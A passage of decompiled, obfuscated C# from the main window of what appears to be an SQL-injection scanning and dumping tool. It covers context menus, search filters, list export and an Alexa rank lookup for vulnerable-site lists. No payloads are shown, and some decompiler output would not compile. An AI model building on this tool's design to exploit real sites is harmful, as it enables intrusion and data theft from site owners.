				global::Globals.GQueue.method_6(list.ToArray());
			}
			global::Globals.GQueue.method_4();
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
		finally
		{
			this.mnuQueue.Enabled = true;
			this.tsWorker.Enabled = true;
		}
	}

	// Token: 0x06000F4F RID: 3919 RVA: 0x0006A108 File Offset: 0x00068308
	private void method_156(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Right && this.dtgQueue.RowCount == 0)
		{
			try
			{
				foreach (object obj in this.mnuQueue.Items)
				{
					ToolStripItem toolStripItem = (ToolStripItem)obj;
					toolStripItem.Visible = (this.enum6_0 == MainForm.Enum6.const_1);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			this.mnuQueueAddURLs.Visible = true;
			this.mnuQueue.Tag = RuntimeHelpers.GetObjectValue(sender);
			this.mnuQueue.Show(Control.MousePosition);
		}
	}

	// Token: 0x06000F50 RID: 3920 RVA: 0x0006A1C4 File Offset: 0x000683C4
	private void method_157(object sender, DataGridViewCellMouseEventArgs e)
	{
		int num;
		int num4;
		object obj2;
		try
		{
			IL_02:
			ProjectData.ClearProjectError();
			num = -2;
			IL_0A:
			int num2 = 2;
			if (e.Button != MouseButtons.Right)
			{
				goto IL_309;
			}
			IL_1E:
			num2 = 3;
			DataGridView dataGridView = (DataGridView)sender;
			IL_27:
			num2 = 4;
			bool flag = true;
			IL_2B:
			num2 = 6;
			if (flag != (sender == this.dtgSQLi) && flag != (sender == this.dtgFileInclusao) && flag != (sender == this.dtgSQLiNoInjectable))
			{
				goto IL_CE;
			}
			IL_56:
			num2 = 7;
			if (dataGridView.IsCurrentCellInEditMode)
			{
				goto IL_309;
			}
			IL_63:
			num2 = 9;
			if (dataGridView.Rows.Count == 0)
			{
				goto IL_309;
			}
			IL_79:
			num2 = 11;
			this.mnuLWSelectAll.Tag = dataGridView.Rows[e.RowIndex].Selected;
			IL_A2:
			num2 = 12;
			this.mnuListView.Tag = RuntimeHelpers.GetObjectValue(sender);
			IL_B6:
			num2 = 13;
			this.mnuListView.Show(Control.MousePosition);
			goto IL_307;
			IL_CE:
			num2 = 15;
			if (flag == (sender == this.dtgSocks))
			{
				goto IL_307;
			}
			IL_E2:
			num2 = 17;
			if (flag != (sender == this.dtgQueue))
			{
				goto IL_307;
			}
			IL_F6:
			num2 = 18;
			IEnumerator enumerator = this.mnuQueue.Items.GetEnumerator();
			while (enumerator.MoveNext())
			{
				object obj = enumerator.Current;
				ToolStripItem toolStripItem = (ToolStripItem)obj;
				IL_11B:
				num2 = 19;
				toolStripItem.Visible = (this.enum6_0 != MainForm.Enum6.const_1);
				IL_131:
				num2 = 20;
			}
			IL_13D:
			num2 = 21;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
			IL_155:
			num2 = 22;
			this.mnuQueueAddURLs.Visible = true;
			IL_164:
			num2 = 23;
			this.mnuQueueShell.Visible = (dataGridView.SelectedRows.Count == 1 & dataGridView.Rows[e.RowIndex].Selected);
			IL_197:
			num2 = 24;
			this.mnuQueueClipboard.Visible = (dataGridView.SelectedRows.Count > 0 & dataGridView.Rows[e.RowIndex].Selected);
			IL_1CA:
			num2 = 25;
			this.mnuQueueTrash.Visible = (dataGridView.SelectedRows.Count > 0 & dataGridView.Rows[e.RowIndex].Selected);
			IL_1FD:
			num2 = 26;
			this.mnuQueueRomove.Visible = (dataGridView.SelectedRows.Count > 0 & dataGridView.Rows[e.RowIndex].Selected);
			IL_230:
			num2 = 27;
			this.mnuQueueSelectAll.Visible = (dataGridView.RowCount > 1);
			IL_247:
			num2 = 28;
			this.mnuQueueSP1.Visible = (dataGridView.SelectedRows.Count > 0 & dataGridView.Rows[e.RowIndex].Selected);
			IL_27A:
			num2 = 29;
			this.mnuQueueSP2.Visible = (dataGridView.SelectedRows.Count > 0 & dataGridView.Rows[e.RowIndex].Selected);
			IL_2AD:
			num2 = 30;
			this.mnuQueueSP3.Visible = (dataGridView.SelectedRows.Count > 0 & dataGridView.Rows[e.RowIndex].Selected);
			IL_2E0:
			num2 = 31;
			this.mnuQueue.Tag = RuntimeHelpers.GetObjectValue(sender);
			IL_2F4:
			num2 = 32;
			this.mnuQueue.Show(Control.MousePosition);
			IL_307:
			dataGridView = null;
			IL_309:
			goto IL_3F3;
			IL_30E:
			int num3 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_3AA:
			goto IL_3E8;
			IL_3AC:
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num > -2) ? num : 1);
			IL_3C5:;
		}
		catch when (endfilter(obj2 is Exception & num != 0 & num4 == 0))
		{
			Exception ex = (Exception)obj3;
			goto IL_3AC;
		}
		IL_3E8:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_3F3:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x06000F51 RID: 3921 RVA: 0x0006A5EC File Offset: 0x000687EC
	private void method_158(object sender, CancelEventArgs e)
	{
		int num;
		int num4;
		object obj2;
		try
		{
			IL_02:
			ProjectData.ClearProjectError();
			num = -2;
			IL_0A:
			int num2 = 2;
			bool flag = Conversions.ToBoolean(this.mnuLWSelectAll.Tag);
			IL_1D:
			num2 = 3;
			bool flag2 = ((DataGridView)this.mnuListView.Tag).SelectedRows.Count == 1 && flag;
			IL_3F:
			num2 = 4;
			bool flag3 = ((DataGridView)this.mnuListView.Tag).SelectedRows.Count > 0 && flag;
			IL_62:
			num2 = 5;
			bool visible = ((DataGridView)this.mnuListView.Tag).RowCount > 0;
			IL_7E:
			num2 = 6;
			IEnumerator enumerator = this.mnuListView.Items.GetEnumerator();
			while (enumerator.MoveNext())
			{
				object obj = enumerator.Current;
				ToolStripItem toolStripItem = (ToolStripItem)obj;
				IL_A2:
				num2 = 7;
				toolStripItem.Visible = flag;
				IL_AC:
				num2 = 8;
			}
			IL_B7:
			num2 = 9;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
			IL_CF:
			num2 = 10;
			this.mnuLWSelectAll.Visible = visible;
			IL_DF:
			num2 = 11;
			this.mnuLWSelectAllSP.Visible = visible;
			IL_EF:
			num2 = 12;
			this.mnuLWExport.Visible = visible;
			IL_FF:
			num2 = 13;
			this.mnuLWAutoScroll.Visible = true;
			IL_10E:
			num2 = 14;
			this.mnuLWAutoScrollSP.Visible = true;
			IL_11D:
			num2 = 15;
			this.mnuLWSelected.Text = global::Globals.translate_0.GetStr(this, 61, "") + global::Globals.FormatNumbers(((DataGridView)this.mnuListView.Tag).SelectedRows.Count, true);
			IL_162:
			num2 = 16;
			this.mnuLWSelected.Visible = (((DataGridView)this.mnuListView.Tag).SelectedRows.Count > 1);
			IL_18D:
			num2 = 17;
			bool flag4 = this.mnuListView.Tag == this.dtgSQLi && flag3;
			IL_1A8:
			num2 = 18;
			this.mnuLWGoNewDumper.Visible = (flag4 && flag2);
			IL_1BA:
			num2 = 19;
			this.mnuLWGoDumper.Visible = (flag4 && flag2);
			IL_1CC:
			num2 = 20;
			this.mnuLWGoDumper.Enabled = !this.DumperForm.Boolean_0;
			IL_1E8:
			num2 = 21;
			this.mnuLWGoFileDumper.Visible = false;
			IL_1F7:
			num2 = 22;
			this.mnuLWGoNewDumperSP.Visible = (flag4 && flag2);
			IL_209:
			num2 = 23;
			if (!this.mnuLWGoFileDumper.Visible)
			{
				goto IL_255;
			}
			IL_219:
			num2 = 24;
			this.mnuLWGoFileDumper.Visible = !string.IsNullOrEmpty(Conversions.ToString(this.dtgSQLi.SelectedRows[0].Cells[4].Value));
			IL_255:
			num2 = 26;
			this.mnuLWAlexa.Visible = flag2;
			IL_264:
			num2 = 27;
			this.mnuLWShell.Visible = flag2;
			IL_273:
			num2 = 28;
			this.mnuLWClipboard.Visible = flag3;
			IL_283:
			num2 = 29;
			this.mnuLWRemoveSP.Visible = flag3;
			IL_293:
			num2 = 30;
			this.mnuLWRemove.Visible = flag3;
			IL_2A3:
			num2 = 31;
			this.mnuLWTrash.Visible = flag3;
			IL_2B3:
			num2 = 32;
			this.mnuLWReExploiter.Visible = flag3;
			IL_2C3:
			num2 = 33;
			this.mnuLWReExploiter.Enabled = !(this.enum6_0 == MainForm.Enum6.const_2 | this.enum6_0 == MainForm.Enum6.const_3 | this.enum6_0 == MainForm.Enum6.const_5);
			IL_2F1:
			num2 = 34;
			object left = NewLateBinding.LateGet(this.mnuListView.Tag, null, "Name", new object[0], null, null, null);
			IL_315:
			num2 = 36;
			if (!Operators.ConditionalCompareObjectEqual(left, this.dtgSQLi.Name, false))
			{
				goto IL_34E;
			}
			IL_32D:
			num2 = 37;
			bool autoScroll = global::Globals.DG_SQLi.AutoScroll;
			IL_33C:
			num2 = 38;
			this.mnuLWReExploiter.Visible = flag3;
			goto IL_39E;
			IL_34E:
			num2 = 40;
			if (!Operators.ConditionalCompareObjectEqual(left, this.dtgSQLiNoInjectable.Name, false))
			{
				goto IL_377;
			}
			IL_366:
			num2 = 41;
			autoScroll = global::Globals.DG_SQLiNoInjectable.AutoScroll;
			goto IL_39E;
			IL_377:
			num2 = 43;
			if (!Operators.ConditionalCompareObjectEqual(left, this.dtgFileInclusao.Name, false))
			{
				goto IL_39E;
			}
			IL_38F:
			num2 = 44;
			autoScroll = global::Globals.DG_FileInclusao.AutoScroll;
			IL_39E:
			num2 = 45;
			if (!autoScroll)
			{
				goto IL_3C7;
			}
			IL_3A5:
			num2 = 46;
			this.mnuLWAutoScroll.Text = global::Globals.translate_0.GetStr(this, 62, "");
			goto IL_3E7;
			IL_3C7:
			num2 = 48;
			this.mnuLWAutoScroll.Text = global::Globals.translate_0.GetStr(this, 63, "");
			IL_3E7:
			goto IL_50D;
			IL_3EC:
			int num3 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_4C4:
			goto IL_502;
			IL_4C6:
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num > -2) ? num : 1);
			IL_4DF:;
		}
		catch when (endfilter(obj2 is Exception & num != 0 & num4 == 0))
		{
			Exception ex = (Exception)obj3;
			goto IL_4C6;
		}
		IL_502:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_50D:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x06000F52 RID: 3922 RVA: 0x00008672 File Offset: 0x00006872
	private void method_159(object sender, EventArgs e)
	{
		global::Globals.ShellUrl(Conversions.ToString(((DataGridView)this.mnuListView.Tag).SelectedRows[0].Cells[1].Value));
	}

	// Token: 0x06000F53 RID: 3923 RVA: 0x0006AB2C File Offset: 0x00068D2C
	private void method_160(object sender, EventArgs e)
	{
		this.mnuLWAlexa.Enabled = false;
		this.mnuLWAlexa.Tag = RuntimeHelpers.GetObjectValue(((DataGridView)this.mnuListView.Tag).SelectedRows[0].Cells[1].Value);
		this.bckAlexa.RunWorkerAsync(RuntimeHelpers.GetObjectValue(this.mnuLWAlexa.Tag));
	}

	// Token: 0x06000F54 RID: 3924 RVA: 0x0006AB9C File Offset: 0x00068D9C
	private void method_161(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				DataGridView dataGridView = (DataGridView)this.mnuListView.Tag;
				System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();
				int num = dataGridView.SelectedRows.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (i > 0)
					{
						stringBuilder.AppendLine();
					}
					stringBuilder.Append(RuntimeHelpers.GetObjectValue(dataGridView.SelectedRows[i].Cells[1].Value));
				}
				Clipboard.SetText(stringBuilder.ToString());
			}
			catch (Exception ex)
			{
				Interaction.MsgBox(ex.Message, MsgBoxStyle.OkOnly, null);
			}
		}
	}

	// Token: 0x06000F55 RID: 3925 RVA: 0x000086A9 File Offset: 0x000068A9
	private void method_162(object sender, EventArgs e)
	{
		((DataGridView)this.mnuListView.Tag).SelectAll();
	}

	// Token: 0x06000F56 RID: 3926 RVA: 0x0006AC4C File Offset: 0x00068E4C
	private void method_163(object sender, EventArgs e)
	{
		List<string> list = new List<string>();
		DataGridViewRow dataGridViewRow = ((DataGridView)this.mnuListView.Tag).SelectedRows[0];
		string text = Conversions.ToString(dataGridViewRow.Cells[6].Value);
		if (!string.IsNullOrEmpty(text))
		{
			foreach (string text2 in Strings.Split(text, ";", -1, CompareMethod.Binary))
			{
				if (text2.Contains("]"))
				{
					text2 = text2.Substring(checked(text2.IndexOf("]") + 1)).Trim();
					if (text2.Contains("."))
					{
						list.Add(text2);
					}
				}
			}
		}
		this.method_9(Conversions.ToString(dataGridViewRow.Cells[1].Value), Conversions.ToString(dataGridViewRow.Cells[2].Value), list);
	}

	// Token: 0x06000F57 RID: 3927 RVA: 0x0006AD3C File Offset: 0x00068F3C
	private void method_164(object sender, EventArgs e)
	{
		DataGridView dataGridView = (DataGridView)this.mnuListView.Tag;
		this.DumperForm.method_76();
		this.DumperForm.txtURL.Text = Conversions.ToString(dataGridView.SelectedRows[0].Cells[1].Value);
		this.DumperForm.cmbSqlType.Text = Conversions.ToString(dataGridView.SelectedRows[0].Cells[2].Value);
		this.DumperForm.method_90(null, null);
		if (this.bool_3)
		{
			this.mdiTabControl.SelectItem(2);
		}
		else
		{
			this.twMain.SelectedNode = this.treeNode_3;
		}
	}

	// Token: 0x06000F58 RID: 3928 RVA: 0x0006ADFC File Offset: 0x00068FFC
	private void method_165(object sender, DataGridViewCellEventArgs e)
	{
		switch (e.ColumnIndex)
		{
		case 1:
		case 3:
		case 4:
		case 6:
		case 8:
			break;
		default:
			this.mnuListView.Tag = RuntimeHelpers.GetObjectValue(sender);
			this.method_164(null, null);
			break;
		}
	}

	// Token: 0x06000F59 RID: 3929 RVA: 0x000027EC File Offset: 0x000009EC
	private void method_166(object sender, EventArgs e)
	{
	}

	// Token: 0x06000F5A RID: 3930 RVA: 0x0006AE54 File Offset: 0x00069054
	private void method_167(object sender, EventArgs e)
	{
		using (Exporter exporter = new Exporter((DataGridView)this.mnuListView.Tag))
		{
			exporter.Text = this.mnuLWExport.Text;
			exporter.ShowDialog(this);
		}
	}

	// Token: 0x06000F5B RID: 3931 RVA: 0x0006AEAC File Offset: 0x000690AC
	private void method_168(object sender, EventArgs e)
	{
		try
		{
			foreach (object obj in ((DataGridView)this.mnuListView.Tag).SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				global::Globals.GTrash.method_0(Conversions.ToString(dataGridViewRow.Cells[1].Value));
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		this.method_169(null, null);
	}

	// Token: 0x06000F5C RID: 3932 RVA: 0x0006AF3C File Offset: 0x0006913C
	private void method_169(object sender, EventArgs e)
	{
		object left = NewLateBinding.LateGet(this.mnuListView.Tag, null, "Name", new object[0], null, null, null);
		if (Operators.ConditionalCompareObjectEqual(left, this.dtgSQLi.Name, false))
		{
			global::Globals.DG_SQLi.method_4();
		}
		else if (Operators.ConditionalCompareObjectEqual(left, this.dtgSQLiNoInjectable.Name, false))
		{
			global::Globals.DG_SQLiNoInjectable.method_4();
		}
		else if (Operators.ConditionalCompareObjectEqual(left, this.dtgFileInclusao.Name, false))
		{
			global::Globals.DG_FileInclusao.method_4();
		}
	}

	// Token: 0x06000F5D RID: 3933 RVA: 0x0006AFC8 File Offset: 0x000691C8
	private void method_170(object sender, EventArgs e)
	{
		bool autoScroll;
		if (Operators.CompareString(this.mnuLWAutoScroll.Text, global::Globals.translate_0.GetStr(this, 62, ""), false) == 0)
		{
			this.mnuLWAutoScroll.Text = global::Globals.translate_0.GetStr(this, 63, "");
			autoScroll = false;
		}
		else
		{
			autoScroll = true;
			this.mnuLWAutoScroll.Text = global::Globals.translate_0.GetStr(this, 62, "");
		}
		object left = NewLateBinding.LateGet(this.mnuListView.Tag, null, "Name", new object[0], null, null, null);
		if (Operators.ConditionalCompareObjectEqual(left, this.dtgSQLi.Name, false))
		{
			global::Globals.DG_SQLi.AutoScroll = autoScroll;
		}
		else if (Operators.ConditionalCompareObjectEqual(left, this.dtgSQLiNoInjectable.Name, false))
		{
			global::Globals.DG_SQLiNoInjectable.AutoScroll = autoScroll;
		}
		else if (Operators.ConditionalCompareObjectEqual(left, this.dtgFileInclusao.Name, false))
		{
			global::Globals.DG_FileInclusao.AutoScroll = autoScroll;
		}
	}

	// Token: 0x06000F5E RID: 3934 RVA: 0x0006B0C0 File Offset: 0x000692C0
	private void method_171(object sender, KeyPressEventArgs e)
	{
		if (Strings.Asc(e.KeyChar) == 13)
		{
			bool flag;
			if ((flag = true) == (sender == this.txtSQLiSearch))
			{
				this.method_172(this.btnSQLiSearch, null);
			}
			else if (flag == (this.txtSQLiNoInjectableSearch == this.txtSQLiSearch))
			{
				this.method_172(this.btnSQLiNoInjectableSearch, null);
			}
			else if (flag == (this.txtFileInclusaoSearch == this.txtSQLiSearch))
			{
				this.method_172(this.btnFileInclusaoSearch, null);
			}
			e.Handled = true;
		}
	}

	// Token: 0x06000F5F RID: 3935 RVA: 0x0006B148 File Offset: 0x00069348
	private void method_172(object sender, EventArgs e)
	{
		BackgroundWorker backgroundWorker = new BackgroundWorker();
		backgroundWorker.DoWork += this.method_174;
		backgroundWorker.RunWorkerCompleted += this.method_175;
		object[] array = new object[3];
		bool flag;
		if ((flag = true) == (sender == this.btnSQLiSearch) || flag == (sender == this.btnSQLiSearchClear))
		{
			array[0] = global::Globals.DG_SQLi;
			array[1] = this.txtSQLiSearch.Text;
			array[2] = this.cmbSQLiSearch.SelectedIndex;
			this.tsSQLi.Enabled = false;
		}
		else if (flag == (sender == this.btnSQLiNoInjectableSearch) || flag == (sender == this.btnSQLiNoInjectableSearchClear))
		{
			array[0] = global::Globals.DG_SQLiNoInjectable;
			array[1] = this.txtSQLiNoInjectableSearch.Text;
			array[2] = this.cmbSQLiNoInjectableSearch.SelectedIndex;
			this.tsSQLiNoInjectable.Enabled = false;
		}
		else if (flag == (sender == this.btnFileInclusaoSearch) || flag == (sender == this.btnFileInclusaoSearchClear))
		{
			array[0] = global::Globals.DG_FileInclusao;
			array[1] = this.txtFileInclusaoSearch.Text;
			array[2] = this.cmbFileInclusaoSearch.SelectedIndex;
			this.tsFileInclusao.Enabled = false;
		}
		bool flag2;
		if ((flag2 = true) == (sender == this.btnSQLiSearchClear) || flag2 == (sender == this.btnSQLiNoInjectableSearchClear) || flag2 == (sender == this.btnFileInclusaoSearchClear))
		{
			array[1] = "";
			array[2] = 0;
		}
		Application.DoEvents();
		backgroundWorker.RunWorkerAsync(array);
	}

	// Token: 0x06000F60 RID: 3936 RVA: 0x0006B2D0 File Offset: 0x000694D0
	private void method_173(object sender, EventArgs e)
	{
		if (sender != null)
		{
			ToolStripComboBox toolStripComboBox = (ToolStripComboBox)sender;
			if (toolStripComboBox.SelectedIndex >= 0)
			{
				bool flag;
				if ((flag = true) == (toolStripComboBox == this.cmbSQLiFilter))
				{
					if (global::Globals.DG_SQLi != null)
					{
						global::Globals.DG_SQLi.method_0((Class29.Enum2)toolStripComboBox.SelectedIndex);
						this.method_172(this.btnSQLiSearch, null);
					}
				}
				else if (flag == (toolStripComboBox == this.cmbSQLiNoInjectableFilter))
				{
					if (global::Globals.DG_SQLiNoInjectable != null)
					{
						global::Globals.DG_SQLiNoInjectable.method_0((Class29.Enum2)toolStripComboBox.SelectedIndex);
						this.method_172(this.btnSQLiNoInjectableSearch, null);
					}
				}
				else if (flag == (toolStripComboBox == this.cmbFileInclusaoFilter) && global::Globals.DG_FileInclusao != null)
				{
					global::Globals.DG_FileInclusao.method_0((Class29.Enum2)toolStripComboBox.SelectedIndex);
					this.method_172(this.btnFileInclusaoSearch, null);
				}
			}
		}
	}

	// Token: 0x06000F61 RID: 3937 RVA: 0x0006B3A8 File Offset: 0x000695A8
	private void method_174(object sender, DoWorkEventArgs e)
	{
		try
		{
			if (base.InvokeRequired)
			{
				base.Invoke(new MainForm.Delegate50(this.method_174), new object[]
				{
					sender,
					e
				});
			}
			else
			{
				Class29 @class = (Class29)NewLateBinding.LateIndexGet(e.Argument, new object[]
				{
					0
				}, null);
				string text = Conversions.ToString(NewLateBinding.LateIndexGet(e.Argument, new object[]
				{
					1
				}, null));
				int num = Conversions.ToInteger(NewLateBinding.LateIndexGet(e.Argument, new object[]
				{
					2
				}, null));
				@class.method_13(text, num);
			}
		}
		catch (Exception ex)
		{
			Interaction.MsgBox(ex.Message, MsgBoxStyle.OkOnly, null);
		}
	}

	// Token: 0x06000F62 RID: 3938 RVA: 0x000086C0 File Offset: 0x000068C0
	private void method_175(object sender, RunWorkerCompletedEventArgs e)
	{
		this.tsSQLi.Enabled = true;
		this.tsSQLiNoInjectable.Enabled = true;
		this.tsFileInclusao.Enabled = true;
	}

	// Token: 0x06000F63 RID: 3939 RVA: 0x000027EC File Offset: 0x000009EC
	private void method_176(object sender, EventArgs e)
	{
	}

	// Token: 0x06000F64 RID: 3940 RVA: 0x000086E6 File Offset: 0x000068E6
	private void method_177(object sender, CancelEventArgs e)
	{
		e.Cancel = true;
	}

	// Token: 0x06000F65 RID: 3941 RVA: 0x000086EF File Offset: 0x000068EF
	private void method_178(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Right)
		{
			this.mnuSearchColumn.Show(Control.MousePosition);
		}
	}

	// Token: 0x06000F66 RID: 3942 RVA: 0x0006B47C File Offset: 0x0006967C
	private void method_179(object sender, EventArgs e)
	{
		if (this.cmbSearchColumn.SelectedItem != null)
		{
			this.cmbSearchColumn.Items.Remove(RuntimeHelpers.GetObjectValue(this.cmbSearchColumn.SelectedItem));
		}
		this.cmbSearchColumn.Text = "";
	}

	// Token: 0x06000F67 RID: 3943 RVA: 0x00008710 File Offset: 0x00006910
	private void method_180(object sender, EventArgs e)
	{
		this.cmbSearchColumn.Items.Clear();
		this.cmbSearchColumn.Text = "";
	}

	// Token: 0x06000F68 RID: 3944 RVA: 0x00008732 File Offset: 0x00006932
	private void method_181(object sender, EventArgs e)
	{
		this.cmbSearchColumn.Enabled = this.chkSearchColumn.Checked;
	}

	// Token: 0x06000F69 RID: 3945 RVA: 0x0000874A File Offset: 0x0000694A
	private void method_182(object sender, EventArgs e)
	{
		this.cmbSearchColumn2.Visible = this.chkSearchColumn2.Checked;
	}

	// Token: 0x06000F6A RID: 3946 RVA: 0x00008762 File Offset: 0x00006962
	private void method_183(object sender, EventArgs e)
	{
		this.cmbSearchColumn3.Visible = this.chkSearchColumn3.Checked;
	}

	// Token: 0x06000F6B RID: 3947 RVA: 0x0000877A File Offset: 0x0000697A
	private void method_184(object sender, EventArgs e)
	{
		this.cmbSearchColumn4.Visible = this.chkSearchColumn4.Checked;
	}

	// Token: 0x06000F6C RID: 3948 RVA: 0x00008792 File Offset: 0x00006992
	private void method_185(object sender, EventArgs e)
	{
		this.txtSearchFilter.Enabled = this.btnSearchFilter.Checked;
	}

	// Token: 0x06000F6D RID: 3949 RVA: 0x0006B4CC File Offset: 0x000696CC
	private void method_186(object sender, EventArgs e)
	{
		int num;
		int num4;
		object obj;
		try
		{
			IL_02:
			ProjectData.ClearProjectError();
			num = -2;
			IL_0A:
			int num2 = 2;
			if (((MouseEventArgs)e).Button != MouseButtons.Left)
			{
				goto IL_EB;
			}
			IL_23:
			num2 = 3;
			if (this.dtgSQLi.SelectedRows.Count != 1)
			{
				goto IL_EB;
			}
			IL_3D:
			num2 = 4;
			if (this.DumperForm.Boolean_0)
			{
				goto IL_EB;
			}
			IL_52:
			num2 = 5;
			if (!this.bool_3)
			{
			}
			IL_5C:
			num2 = 8;
			this.DumperForm.method_76();
			IL_69:
			num2 = 9;
			this.DumperForm.txtURL.Text = Conversions.ToString(this.dtgSQLi.SelectedRows[0].Cells[1].Value);
			IL_A2:
			num2 = 10;
			this.DumperForm.cmbSqlType.Text = Conversions.ToString(this.dtgSQLi.SelectedRows[0].Cells[2].Value);
			IL_DB:
			num2 = 11;
			this.DumperForm.method_90(null, null);
			IL_EB:
			goto IL_181;
			IL_F0:
			int num3 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_13A:
			goto IL_176;
			IL_13C:
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num > -2) ? num : 1);
			IL_154:;
		}
		catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
		{
			Exception ex = (Exception)obj2;
			goto IL_13C;
		}
		IL_176:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_181:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x06000F6E RID: 3950 RVA: 0x000087AA File Offset: 0x000069AA
	private void method_187(object sender, EventArgs e)
	{
		this.btnSearchColumnStart.Enabled = (this.dtgSQLi.SelectedRows.Count > 0 & this.enum6_0 != MainForm.Enum6.const_4);
	}

	// Token: 0x06000F6F RID: 3951 RVA: 0x0006B680 File Offset: 0x00069880
	private void method_188(object sender, KeyEventArgs e)
	{
		bool flag;
		Class29 @class;
		if ((flag = true) == (sender == this.dtgSQLi))
		{
			@class = global::Globals.DG_SQLi;
		}
		else if (flag == (sender == this.dtgSQLiNoInjectable))
		{
			@class = global::Globals.DG_SQLiNoInjectable;
		}
		else if (flag == (sender == this.dtgFileInclusao))
		{
			@class = global::Globals.DG_FileInclusao;
		}
		else if (flag == (sender == this.dtgQueue))
		{
			@class = global::Globals.DG_FileInclusao;
		}
		else if (flag == (sender == this.dtgSocks))
		{
			@class = global::Globals.DG_FileInclusao;
		}
		if (e.Control)
		{
			if (e.KeyCode == Keys.A)
			{
				@class.method_8();
			}
		}
		else if (e.KeyCode == Keys.Delete)
		{
			@class.method_4();
		}
		else if (e.KeyCode == Keys.Return & sender == this.dtgSQLi)
		{
			MouseEventArgs e2 = new MouseEventArgs(MouseButtons.Left, 1, 1, 1, 0);
			this.method_186(this.dtgSQLi, e2);
		}
	}

	// Token: 0x06000F70 RID: 3952 RVA: 0x0006B760 File Offset: 0x00069960
	private void method_189(object sender, DataGridViewCellEventArgs e)
	{
		checked
		{
			if (this.bool_2)
			{
				DataGridView dataGridView = (DataGridView)sender;
				if (dataGridView.Tag != null)
				{
					Class29 @class = (Class29)dataGridView.Tag;
					string text = Conversions.ToString(dataGridView.Rows[e.RowIndex].Cells[e.ColumnIndex].Value);
					if (text == null)
					{
						text = "";
					}
					bool flag = true;
					if (e.ColumnIndex == 1)
					{
						if (!Class23.smethod_13(text, true))
						{
							flag = false;
						}
						if (dataGridView == this.dtgSQLi && !text.Contains("[t]"))
						{
							flag = false;
						}
					}
					if (flag)
					{
						@class.method_3(text, e.ColumnIndex - 1, dataGridView.Rows[e.RowIndex]);
					}
					else
					{
						text = ((Class29.Class30)dataGridView.Rows[e.RowIndex].Tag).Items[e.ColumnIndex - 1];
						dataGridView.Rows[e.RowIndex].Cells[e.ColumnIndex].Value = text;
					}
				}
			}
		}
	}

	// Token: 0x06000F71 RID: 3953 RVA: 0x0006B884 File Offset: 0x00069A84
	private void method_190(object sender, DoWorkEventArgs e)
	{
		List<string> list = new List<string>();
		try
		{
			string arg = Class23.smethod_11(Conversions.ToString(e.Argument));
			string url = string.Format("https://www.alexa.com/siteinfo/{0}", arg);
			Http http = new Http();
			http.UserAgent = Conversions.ToString(global::Globals.GetObjectValue(global::Globals.GMain.txtUserAgent));
			http.Accept = Conversions.ToString(global::Globals.GetObjectValue(global::Globals.GMain.txtAccept));
			http.ConnectTimeout = Conversions.ToInteger(global::Globals.GetObjectValue(global::Globals.GMain.numHTTPTimeout));
			http.ReadTimeout = http.ConnectTimeout;
			http.FollowRedirects = true;
			http.AutoAddHostHeader = true;
			http.AllowGzip = true;
			http.SendCookies = true;
			http.SaveCookies = true;
			http.CookieDir = "memory";
			http.UseIEProxy = false;
			string text = http.QuickGetStr(url);
			if (text.Contains("http://aws.amazon.com/awis -->"))
			{
				string text2 = text.Substring(checked(text.IndexOf("http://aws.amazon.com/awis -->") + "http://aws.amazon.com/awis -->".Length));
				text2 = text2.Substring(0, text2.IndexOf("<")).Trim();
				if (!string.IsNullOrEmpty(text2))
				{
					list.Add("Global Rank: " + text2);
				}
			}
			try
			{
				foreach (string text3 in list)
				{
					if (!text3.Contains("N/A"))
					{
						e.Result = Operators.ConcatenateObject(e.Result, text3 + "\r\n");
					}
				}
			}
			finally
			{
				List<string>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
			if (string.IsNullOrEmpty(Conversions.ToString(e.Result)))
			{
				e.Result = "Not Found";
			}
		}
		catch (Exception ex)
		{
			e.Result = ex.Message;
		}
	}

	// Token: 0x06000F72 RID: 3954 RVA: 0x0006BA88 File Offset: 0x00069C88
	private void method_191(object sender, RunWorkerCompletedEventArgs e)
	{
		this.mnuLWAlexa.Enabled = true;
		if (e.Error != null)
		{
			MessageBox.Show(e.Error.Message);
		}
		else
		{
			using (new Class8(global::Globals.GMain))
			{
				string text = Class23.smethod_11(Conversions.ToString(this.mnuLWAlexa.Tag));
				if (MessageBox.Show(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(e.Result, "\r\n"), global::Globals.translate_0.GetStr(this, 64, ""))), this.mnuLWAlexa.Text + " [" + text + "]", MessageBoxButtons.YesNo, MessageBoxIcon.Question, MessageBoxDefaultButton.Button2) == DialogResult.Yes)
				{
					global::Globals.ShellUrl("http://www.alexa.com/siteinfo/" + text);
				}
			}
		}
	}

	// Token: 0x06000F73 RID: 3955 RVA: 0x0006BB68 File Offset: 0x00069D68
